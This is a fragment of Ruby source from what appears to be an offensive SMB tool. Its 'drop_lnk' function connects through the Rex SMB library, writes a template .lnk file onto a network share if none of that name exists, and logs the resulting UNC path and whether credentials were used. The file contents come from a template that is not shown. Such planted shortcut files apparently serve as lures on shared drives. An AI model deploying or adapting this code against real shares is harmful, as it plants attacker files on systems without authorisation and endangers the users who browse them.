##########################
### Modes of Operation ###
##########################

# General drop mode that drops a lnk using the lnkname variable
# as the name. Just breaks if the name already exists.
def drop_lnk(config, sclient, share, lnkname=nil)

	lnkname ||= config.lnkname

	lnkname += '.lnk' unless lnkname =~ /\.lnk$/i
	listing,success = sclient.get_file_listing

	if ! listing

		$prompt.incind
		$prompt.symbol = '!'
		$prompt.alert("Error: #{success.gsub(/^.+:/,'')}", true, false)
		$prompt.decind
		
		return

	end

	if listing.include?(lnkname)

		$prompt.incind
		# $prompt.alert(" [DROP FAILURE] Link file already exists (#{lnkname})", true, false)
		puts " [DROP FAILURE]".yellow()
		$prompt.alert("LNK file already exists (#{lnkname})".yellow, true, false)
		$prompt.decind

	else


		begin

			# $prompt.alert("Dropping link file: #{lnkname}", false, false)
			sclient.client.open(lnkname)
			sclient.client.write(sclient.client.last_file_id, 0,
				$template.force_encoding("ASCII-8BIT"))

			config.dropped_lnks << LogRecord.new(
				sclient.socket.peerhost,
				sclient.socket.peerport,
				share.name,
				lnkname,
				DateTime.now.to_s )

			if config.creds.username and config.creds.password
				config.dropped_lnks.last.authenticated = true
			end

			$prompt.incind

			puts " [DROP SUCCESS]".green()
			$prompt.alert(config.dropped_lnks.last.to_unc, true, false)

			$prompt.decind

		rescue Rex::Proto::SMB::Exceptions::ErrorCode,
			Timeout::Error => error

			puts ' [DROP FAILURE]'.green()

			$prompt.symbol = '!'
			$prompt.alert("Drop Failed: #{error.message.gsub(/^.+:/,'')}", true, false)

		end


	end

	

end

##############################
### End Modes of Operation ###
##############################